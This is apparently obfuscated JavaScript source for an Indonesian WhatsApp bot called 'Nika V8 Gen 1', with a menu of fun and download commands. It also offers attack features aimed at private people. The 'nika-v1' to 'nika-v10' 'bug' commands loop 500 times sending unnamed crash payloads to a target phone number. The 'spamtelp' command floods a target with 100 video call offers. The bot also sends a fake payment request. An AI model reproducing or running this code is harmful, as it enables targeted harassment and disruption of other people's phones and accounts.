      const _0x42a01c = "https://files.catbox.moe/aum5nh.jpg";
      return _0x4b0487.sendMessage(_0x172af6.chat, {
        text: "" + _0x508023,
        contextInfo: {
          mentionedJid: [_0x172af6.sender],
          externalAdReply: {
            showAdAttribution: true,
            thumbnailUrl: _0x42a01c,
            title: "𝐍𝐢𝐤𝐚 𝐕𝟖 𝐆𝐞𝐧 𝟏 ☀",
            body: "Depayy...,",
            previewType: "PHOTO"
          }
        }
      }, {
        quoted: _0x5e0a0c
      });
    }
    switch (_0x3d57b5) {
      case "menu":
        {
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "☀",
              key: _0x172af6.key
            }
          });
          let _0x48b9d1 = "`𝐍𝐈𝐊𝐀 𝐕𝟖 𝐆𝐄𝐍 𝟏`\n𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : depayyy\n𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : Nika☀\n𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 8.g.1 Free!! \n𝐏𝐫𝐞𝐟𝐢𝐱 : .\n𝐒𝐭𝐚𝐭𝐮𝐬 𝐒𝐜𝐫𝐢𝐩𝐭 : Free!!!! \n𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐒𝐜𝐫𝐢𝐩𝐭 : `" + runtime(process.uptime()) + "`\n\n`こんにちは、Depayが特別なランランクで作成したスクリプトボットがあります。私のボットを賢く使ってください`\n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n`[ Command Bug ]`\n봀 Bug Menu Anti Kenon\n→ .nika-v1 628xxx\n→ .nika-v2 628xxx\n→ .nika-v3 628xxx\n→ .nika-v4 628xxx\n→ .nika-v5 628xxx\n→ .nika-v6 628xxx\n→ .nika-v7 628xxx\n→ .nika-v8 628xxx\n→ .nika-v9 628xxx\n→ .nika-v10 628xxx\n\n봀 Spam Call\n→ .spamtelp 628xxx\n→ .stelp 628xxx\n\n`[ Command Fun Menu ]`\n봀 Fun Menu\n→ .tourl \n→ .rvo \n→ .swm \n→ .sticker \n→ .qc \n→ .brat \n→ .cekidch \n→ .cekidgc \n→ .reactch \n→ .sertifikattolol \n→ .cekkhodam \n→ .cekganteng \n→ .hd \n\n`[ Command Owner Menu ]`\n봀 Owner Menu\n→ .addmurbug \n→ .addowner\n→ .delmurbug \n→ .delowner\n→ .self *private mode*\n→ .public *public mode*\nInfo Scrip https://whatsapp.com/channel/0029Vay4hgh2Jl8J4yIOIA3i";
          let _0x170e45 = [{
            buttonId: ".tqto",
            buttonText: {
              displayText: "▢ Tqto"
            }
          }];
          let _0x1f6da4 = {
            image: {
              url: "https://files.catbox.moe/bag4bl.jpg"
            },
            gifPlayback: true,
            caption: _0x48b9d1,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: "Nika V8 Gen1",
                body: "© Depay",
                thumbnailUrl: "https://files.catbox.moe/nmqppk.jpg",
                sourceUrl: "",
                mediaType: 1,
                renderLargerThumbnail: true
              }
            },
            footer: "© Nika Version 8 Gen 1",
            buttons: _0x170e45,
            viewOnce: true,
            headerType: 6
          };
          await _0x4b0487.sendMessage(_0x172af6.chat, _0x1f6da4, {
            quoted: _0x5e0a0c
          });
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, {
            quoted: _0x172af6
          });
        }
        break;
      case "owner":
      case "depay":
        {
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "☀",
              key: _0x172af6.key
            }
          });
          let _0x1a4054 = "\n*`𝗖𝗿𝗲𝗮𝘁𝗼𝗿 𝗦𝗰𝗿𝗶𝗽𝘁`*";
          let _0x322406 = generateWAMessageFromContent(_0x172af6.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x172af6.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                      newsletterName: "𝗡𝗶𝗸𝗮𝗮",
                      newsletterJid: "120363409362506610@newsletter",
                      serverMessageId: 143
                    },
                    businessMessageForwardInfo: {
                      businessOwnerJid: _0x4b0487.decodeJid(_0x4b0487.user.id)
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: "𝗢𝘄𝗻𝗲𝗿𝗦𝗰𝗿𝗶𝗽𝘁"
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "𝗡𝗶𝗸𝗮 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟴"
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    title: "",
                    subtitle: "",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                      image: _0xa3cfa3
                    }, {
                      upload: _0x4b0487.waUploadToServer
                    }))
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"𝗢𝘄𝗻𝗲𝗿\",\"url\":\"https://wa.me/628982103547\",\"merchant_url\":\"https://wa.me/628982103547\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"𝗦𝗮𝗹𝘂𝗿𝗮𝗻𝗗𝗲𝘃\",\"url\":\"https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V\",\"merchant_url\":\"https://wa.me/6282298243812\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"𝗠𝗮𝗿𝗸𝗲𝘁𝗣𝗹𝗮𝗰𝗲\",\"url\":\"https://whatsapp.com/channel/0029Vb2tVZHHAdNOOR0nIN0o\",\"merchant_url\":\"https://wa.me/6282298243812\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x4b0487.relayMessage(_0x322406.key.remoteJid, _0x322406.message, {
            messageId: _0x322406.key.id
          });
        }
        break;
      case "script":
      case "sc":
        {
          let _0x4a8a5b = "*NIKA V8 GEN 1 INI FREE YA AJG, LU BELI BERARTI LU BEGO\n`Info Script Nika V8 Gen 1\nhttps://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V\n";
          _0x4b0487.relayMessage(_0x172af6.chat, {
            requestPaymentMessage: {
              currencyCodeIso4217: "IDR",
              amount1000: 80000000,
              requestFrom: _0x172af6.sender,
              noteMessage: {
                extendedTextMessage: {
                  text: _0x4a8a5b,
                  contextInfo: {
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  }
                }
              }
            }
          }, {});
          await sleep(2500);
        }
        break;
      case "tqto":
      case "credit":
        {
          let _0x3f40fb = "`[ 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ]`\n-Depay \n-Difa\n-danzy\n-yudz\n-RafkiGanteng\n-WizzNotFav\n-Furyyoffc\n-BapuksOleng\n-Flux\n-IkyyVX\n-VynxOffc\n-VallzNikaBoy\n-lubyz\n-RizzTmvn\n-Rafi\n-Yaszmrcy\n-Katohvnly\n-Mazz Budetzz\n-Reyy\n-arlzeAcerman\n-Wanz soft spoken\n-NelzzOffcXD\n-DzStore\n`Info Script`\nhttps://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V\n";
          let _0x5d270f = [{
            buttonId: ".owner",
            buttonText: {
              displayText: "▢ Owner"
            }
          }];
          let _0x3a614d = {
            document: {
              url: "https://t.me/DepayyOffc"
            },
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            fileName: "Nika Version 8☀",
            fileLength: 999999999999999,
            pageCount: 99999,
            caption: _0x3f40fb,
            footer: "© DepayyNoCounter",
            buttons: _0x5d270f,
            headerType: 1,
            contextInfo: {
              forwardingScore: 99999,
              externalAdReply: {
                body: "𝐃𝐞𝐩𝐚𝐲𝐲𝐃",
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "peler",
                renderLargerThumbnail: false,
                showAdAttribution: false,
                sourceId: "Tes",
                sourceType: "PDF",
                previewType: "PDF",
                sourceUrl: "https://Depay.com",
                thumbnail: fs.readFileSync("./image/depayy.jpg"),
                thumbnailUrl: fs.readFileSync("./image/depayy.jpg"),
                title: "Depayy"
              }
            },
            viewOnce: true,
            headerType: 6
          };
          await _0x4b0487.sendMessage(_0x172af6.chat, _0x3a614d, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "delete":
      case "del":
        {
          if (_0x172af6.isGroup) {
            if (!_0x23ae7f && !_0x172af6.isAdmin) {
              return _0x3efc1e(mess.admin);
            }
            if (!_0x172af6.quoted) {
              return _0x3efc1e("reply pesannya");
            }
            if (_0x172af6.quoted.fromMe) {
              _0x4b0487.sendMessage(_0x172af6.chat, {
                delete: {
                  remoteJid: _0x172af6.chat,
                  fromMe: true,
                  id: _0x172af6.quoted.id,
                  participant: _0x172af6.quoted.sender
                }
              });
            } else {
              if (!_0x172af6.isBotAdmin) {
                return _0x3efc1e(mess.botAdmin);
              }
              _0x4b0487.sendMessage(_0x172af6.chat, {
                delete: {
                  remoteJid: _0x172af6.chat,
                  fromMe: false,
                  id: _0x172af6.quoted.id,
                  participant: _0x172af6.quoted.sender
                }
              });
            }
          } else {
            if (!_0x23ae7f) {
              return _0x3efc1e(mess.owner);
            }
            if (!_0x172af6.quoted) {
              return _0x3efc1e(_0x22a6b8("reply pesan"));
            }
            _0x4b0487.sendMessage(_0x172af6.chat, {
              delete: {
                remoteJid: _0x172af6.chat,
                fromMe: false,
                id: _0x172af6.quoted.id,
                participant: _0x172af6.quoted.sender
              }
            });
          }
        }
        break;
      case "nika-v10":
      case "nika-v9":
      case "nika-v8":
      case "nika-v7":
      case "nika-v6":
      case "nika-v5":
      case "nika-v4":
      case "nika-v3":
      case "nika-v2":
      case "nika-v1":
        {
          if (!isOwner && !_0x122801 && !_0x1afac2) {
            return _0x3efc1e("Fitur Bug Khusus Owner");
          }
          if (!q) {
            _0x3efc1e("Penggunaan " + (_0x45b1bf + _0x3d57b5) + " 628xxx");
          }
          let _0x1bc15a = q.replace(/[^0-9]/g, "");
          if (_0x1bc15a.startsWith("0")) {
            return reply("Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " + (_0x45b1bf + _0x3d57b5) + " 628xxx");
          }
          let _0x35f770 = _0x1bc15a + "@s.whatsapp.net";
          let _0x42ba6 = "*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *" + _0x1bc15a + "*";
          _0x4b0487.sendMessage(_0x172af6.chat, {
            image: {
              url: "https://files.catbox.moe/aum5nh.jpg"
            },
            caption: "╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣\n┃ SUKSES SEND BUG BY NIKA\n╰━━━━━━━━━━━━━━━━━⬣",
            gifPlayback: true
          }, {
            quoted: _0x172af6
          });
          for (let _0x5d6237 = 0; _0x5d6237 < 500; _0x5d6237++) {
            await _0x2986b2(_0x35f770);
            await _0x278d55(_0x35f770);
            await _0x2986b2(_0x35f770);
            await _0x278d55(_0x35f770);
            await _0x216d7d(_0x35f770);
            await _0x278d55(_0x35f770);
          }
          await _0x216d7d(_0x35f770);
          await _0x2986b2(_0x35f770);
        }
        break;
        async function _0x448cc1(_0x37bbb7) {
          try {
            await _0x4b0487.offerCall(_0x37bbb7, {
              video: true
            });
            console.log(chalk.white.bold("Success Send Offer Video Call To Target"));
          } catch (_0x41854e) {
            console.error(chalk.white.bold("Failed Send Offer Video Call To Target:", _0x41854e));
          }
        }
      case "stelp":
      case "spamtelp":
        {
          if (!isOwner && !_0x122801 && !_0x1afac2) {
            return _0x3efc1e("Fitur ini Khusus Owner");
          }
          if (!q) {
            _0x3efc1e("Penggunaan " + (_0x45b1bf + _0x3d57b5) + " 628xxx");
          } else {
            const _0x5cf94e = "628982103547@s.whatsapp.net";
            let _0xe78b13 = q.replace(/[^0-9]/g, "");
            if (_0xe78b13.startsWith("0")) {
              return _0x3efc1e("• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " + (_0x45b1bf + _0x3d57b5) + " 628xxx");
            }
            let _0x5e4fe6 = _0xe78b13 + "@s.whatsapp.net";
            if (_0x5e4fe6 === _0x5cf94e) {
              _0x3efc1e("*Developernya seleb kocak, gabakal diangkat telp gw👺*");
            } else {
              await _0x4b0487.sendMessage(_0x172af6.chat, {
                react: {
                  text: "📲",
                  key: _0x172af6.key
                }
              });
              await sleep(1500);
              await _0x4b0487.sendMessage(_0x172af6.chat, {
                react: {
                  text: "🎉",
                  key: _0x172af6.key
                }
              });
              _0x3efc1e("*Succes spam call to target " + _0xe78b13 + "*");
              _0x4b0487.sendMessage(_0x5e4fe6, {
                text: "halo mass"
              });
              for (let _0x3dc711 = 0; _0x3dc711 < 100; _0x3dc711++) {
                _0x448cc1(_0x5e4fe6);
                await sleep(2000);
              }
              _0x4b0487.sendMessage(_0x5e4fe6, {
                text: "halo mass"
              });
            }
          }
        }
        break;
      case "hd":
        {
          const _0x598260 = require("jimp");
          const _0x414e02 = require("fs");
          const _0x5bf9d6 = require("path");
          async function _0x323f7b(_0x3e4d01) {
            const _0x5ecb4f = await _0x598260.read(_0x3e4d01);
            const _0x48264b = _0x5ecb4f.bitmap.width;
            const _0x4c0671 = _0x5ecb4f.bitmap.height;
            _0x5ecb4f.resize(_0x48264b * 3, _0x4c0671 * 3).quality(90);
            const _0xbfcc44 = _0x5bf9d6.join(__dirname, "hd-" + Date.now() + ".jpg");
            await _0x5ecb4f.writeAsync(_0xbfcc44);
            const _0x3496b5 = _0x414e02.readFileSync(_0xbfcc44);
            _0x414e02.unlinkSync(_0xbfcc44);
            return _0x3496b5;
          }
          if (!_0x172af6.quoted || _0x172af6.quoted.mtype !== "imageMessage") {
            return _0x4b0487.sendMessage(_0x172af6.chat, {
              text: "Balas gambar dengan command *hd* untuk mengubah ke HD 3x."
            }, {
              quoted: _0x172af6
            });
          }
          try {
            const _0x4a7e7b = await _0x172af6.quoted.download();
            const _0x1fad3b = await _0x323f7b(_0x4a7e7b);
            await _0x4b0487.sendMessage(_0x172af6.chat, {
              image: _0x1fad3b,
              caption: "Ini Dia versi HD Nya!"
            }, {
              quoted: _0x172af6
            });
          } catch (_0x401e36) {
            console.error(_0x401e36);
            _0x4b0487.sendMessage(_0x172af6.chat, {
              text: "Gagal convert ke HD 3x."
            }, {
              quoted: _0x172af6
            });
          }
        }
        break;
      case "cekganteng":
        {
          if (!_0xd4ebe7[0]) {
            return _0x3efc1e("NAMA LU MANA??");
          }
          const _0x31ffcb = ["cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet", "80% gantengggg parah", "90% Ganteng idaman ciwi ciwi", "100% Ganteng Bgt bjirr"];
          const _0x50ed81 = _0x31ffcb[Math.floor(Math.random() * _0x31ffcb.length)];
          const _0x305b79 = "𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *" + _0xd4ebe7[0] + "* *" + _0x50ed81 + "*\n";
          _0x3efc1e(_0x305b79);
        }
        break;
      case "cekkhodam":
      case "cekkodam":
        {
          if (!_0x3b31a4) {
            return _0x3efc1e("nama siapa yang mau di cek khodam nya");
          }
          function _0x4e1c38(_0x1972e1) {
            return _0x1972e1[Math.floor(_0x1972e1.length * Math.random())];
          }
          const _0x438c64 = ["pecel lele", "kumis lele", "Ambatron", "Ambatukam", "Kacang Hijau", "Kulkas mini", "Burung beo", "Air", "Api", "Batu", "Magnet", "Sempak", "Botol Tupperware", "Badut Mixue", "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan", "Upin", "Ipin", "sungut lele", "Tok Dalang", "Opah", "Opet", "Alul", "Pak Vinsen", "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", "Lumpia Basah", "Bjorka", "Hacker", "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", "Seblak", "Aromanis", "Gelembung sabun", "Kuda", "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan", "Nasi Kucing", "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang", "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", "Sayur Asem", "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", "Lintah Terbang", "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", "Beat Mber", "Supra Geter", "Oli Samping", "Knalpot Racing", "Jus Stroberi", "Jus Alpukat", "Alpukat Kocok", "Es Kopyor", "Es Jeruk", "@whiskeysockets/baileys", "chalk", "gradient-string", "@adiwajshing", "d-scrape", "undefined", "cannot read properties", "performance-now", "os", "node-fetch", "form-data", "axios", "util", "fs-extra", "scrape-primbon", "child_process", "emoji-regex", "check-disk-space", "perf_hooks", "moment-timezone", "cheerio", "fs", "process", "require( . . . )", "import ... from ...", "rate-overlimit", "Cappucino Cincau", "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu", "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", "Kotak Amal", "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", "Ban Serep", "Kursi Lipat", "Kursi Goyang", "Kulit Pisang", "Warung Madura", "Gorong-gorong"];
          let _0x36b352 = _0x4e1c38(_0x438c64);
          const _0x437c96 = "*Ternyata Khodam " + _0x3b31a4 + " adalah:* " + _0x36b352;
          _0x3efc1e(_0x437c96);
        }
        break;
      case "sertifikattolol":
        {
          if (_0xd4ebe7.length === 0) {
            await _0x4b0487.sendMessage(_0x172af6.chat, {
              text: "❗ Silakan masukkan teks untuk sertifikat.\n\nContoh: *.tolol Jamal*"
            }, {
              quoted: _0x172af6
            });
            break;
          }
          const _0x156a46 = _0xd4ebe7.join(" ");
          const _0x3eeed6 = "https://api.siputzx.my.id/api/m/sertifikat-tolol?text=" + encodeURIComponent(_0x156a46);
          try {
            await _0x4b0487.sendMessage(_0x172af6.chat, {
              image: {
                url: _0x3eeed6
              },
              caption: "🖼️ *Sertifikat Tolol Untuk " + _0x156a46 + "*"
            }, {
              quoted: _0x172af6
            });
          } catch (_0xbcec78) {
            console.error("Error mengambil gambar:", _0xbcec78.message);
            await _0x4b0487.sendMessage(_0x172af6.chat, {
              text: "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!"
            }, {
              quoted: _0x172af6
            });
          }
          break;
        }
      case "clsesi":
      case "clearsession":
        {
          const _0x1c3d7a = fs.readdirSync("./session").filter(_0x18d947 => _0x18d947 !== "creds.json");
          const _0x430320 = fs.readdirSync("./library/database/sampah").filter(_0x582e59 => _0x582e59 !== "A");
          for (const _0x2638f0 of _0x1c3d7a) {
            await fs.unlinkSync("./session/" + _0x2638f0);
          }
          for (const _0x5c8e0d of _0x430320) {
            await fs.unlinkSync("./library/database/sampah/" + _0x5c8e0d);
          }
          _0x3efc1e("*Berhasil membersihkan sampah ✅*\n*" + _0x1c3d7a.length + "* sampah session\n*" + _0x430320.length + "* sampah file");
        }
        break;
      case "yts":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("we dont talk"));
          }
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "🔎",
              key: _0x172af6.key
            }
          });
          let _0x32fdca = await yts(_0x3b31a4);
          const _0x2d019a = _0x32fdca.all;
          let _0x18f4a8 = "\n    *[ Result From Youtube Search 🔍 ]*\n\n";
          for (let _0x1edbf5 of _0x2d019a) {
            _0x18f4a8 += "* *Title :* " + _0x1edbf5.title + "\n* *Durasi :* " + _0x1edbf5.timestamp + "\n* *Upload :* " + _0x1edbf5.ago + "\n* *Views :* " + _0x1edbf5.views + "\n* *Author :* " + (_0x1edbf5?.author?.name || "Unknown") + "\n* *Source :* " + _0x1edbf5.url + "\n\n";
          }
          await _0x172af6.reply(_0x18f4a8);
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "",
              key: _0x172af6.key
            }
          });
        }
        break;
      case "tt":
      case "tiktok":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("url"));
          }
          if (!_0x3b31a4.startsWith("https://")) {
            return _0x172af6.reply(_0x22a6b8("url"));
          }
          await tiktokDl(q).then(async _0x3fd568 => {
            await _0x4b0487.sendMessage(_0x172af6.chat, {
              react: {
                text: "🕖",
                key: _0x172af6.key
              }
            });
            if (!_0x3fd568.status) {
              return _0x172af6.reply("Error");
            }
            if (_0x3fd568.durations == 0 && _0x3fd568.duration == "0 Seconds") {
              let _0x4e316d = new Array();
              let _0xa419f7 = 0;
              for (let _0x5da773 of _0x3fd568.data) {
                let _0x1fd6b0 = await prepareWAMessageMedia({
                  image: {
                    url: "" + _0x5da773.url
                  }
                }, {
                  upload: _0x4b0487.waUploadToServer
                });
                await _0x4e316d.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: "Foto Slide Ke *" + (_0xa419f7 += 1) + "*",
                    hasMediaAttachment: true,
                    ..._0x1fd6b0
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Link Tautan Foto\",\"url\":\"" + _0x5da773.url + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                });
              }
              const _0x4f693b = await generateWAMessageFromContent(_0x172af6.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*Sukses*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: _0x4e316d
                      })
                    })
                  }
                }
              }, {
                userJid: _0x172af6.sender,
                quoted: _0x172af6
              });
              await _0x4b0487.relayMessage(_0x172af6.chat, _0x4f693b.message, {
                messageId: _0x4f693b.key.id
              });
            } else {
              let _0x2ebe99 = await _0x3fd568.data.find(_0x29b33a => _0x29b33a.type == "nowatermark_hd" || _0x29b33a.type == "nowatermark");
              await _0x4b0487.sendMessage(_0x172af6.chat, {
                video: {
                  url: _0x2ebe99.url
                },
                mimetype: "video/mp4",
                caption: "*Sukses*"
              }, {
                quoted: _0x172af6
              });
            }
          }).catch(_0x529086 => console.log(_0x529086));
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "",
              key: _0x172af6.key
            }
          });
        }
        break;
      case "ssweb":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("https://example.com"));
          }
          if (!isUrl(_0x3b31a4)) {
            return _0x172af6.reply(_0x22a6b8("https://example.com"));
          }
          const {
            screenshotV1: _0x1f6012,
            screenshotV2: _0x16537d,
            screenshotV3: _0x3a1f91
          } = require("getscreenshot.js");
          const _0x2391fd = require("fs");
          var _0x23f1f2 = await _0x16537d(_0x3b31a4);
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            image: _0x23f1f2,
            mimetype: "image/png"
          }, {
            quoted: _0x172af6
          });
        }
        break;
      case "shortlink":
      case "shorturl":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("https://example.com"));
          }
          if (!isUrl(_0x3b31a4)) {
            return _0x172af6.reply(_0x22a6b8("https://example.com"));
          }
          var _0x38de97 = await axios.get("https://tinyurl.com/api-create.php?url=" + encodeURIComponent(_0x3b31a4));
          var _0x1c15b4 = "\n* *Shortlink by tinyurl.com*\n" + _0x38de97.data.toString() + "\n";
          return _0x172af6.reply(_0x1c15b4);
        }
        break;
      case "shortlink-dl":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("https://example.com"));
          }
          if (!isUrl(_0x3b31a4)) {
            return _0x172af6.reply(_0x22a6b8("https://example.com"));
          }
          var _0x48c0ab = await fetch("https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=" + _0x3b31a4);
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x48c0ab.url
          }, {
            quoted: _0x172af6
          });
        }
        break;
      case "idgc":
      case "cekidgc":
        {
          if (!_0x172af6.isGroup) {
            return _0x350195(mess.group);
          }
          _0x172af6.reply(_0x172af6.chat);
        }
        break;
      case "listgc":
      case "listgrup":
        {
          if (!_0x23ae7f) {
            return;
          }
          let _0x4a25ba = "\n *List all group chat*\n";
          let _0x3dbba8 = await _0x4b0487.groupFetchAllParticipating();
          let _0x313986 = Object.values(_0x3dbba8);
          _0x4a25ba += "\n* *Total group :* " + _0x313986.length + "\n";
          for (const _0x1b0678 of _0x313986) {
            _0x4a25ba += "\n* *ID :* " + _0x1b0678.id + "\n* *Nama :* " + _0x1b0678.subject + "\n* *Member :* " + _0x1b0678.participants.length + "\n* *Status :* " + (_0x1b0678.announce == false ? "Terbuka" : "Hanya Admin") + "\n* *Pembuat :* " + (_0x1b0678?.subjectOwner ? _0x1b0678?.subjectOwner.split("@")[0] : "Sudah Keluar") + "\n";
          }
          return _0x172af6.reply(_0x4a25ba);
        }
        break;
      case "cekidch":
      case "idch":
        {
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("linkchnya"));
          }
          if (!_0x3b31a4.includes("https://whatsapp.com/channel/")) {
            return _0x172af6.reply("Link tautan tidak valid");
          }
          let _0x5a6ef8 = _0x3b31a4.split("https://whatsapp.com/channel/")[1];
          let _0x379dbb = await _0x4b0487.newsletterMetadata("invite", _0x5a6ef8);
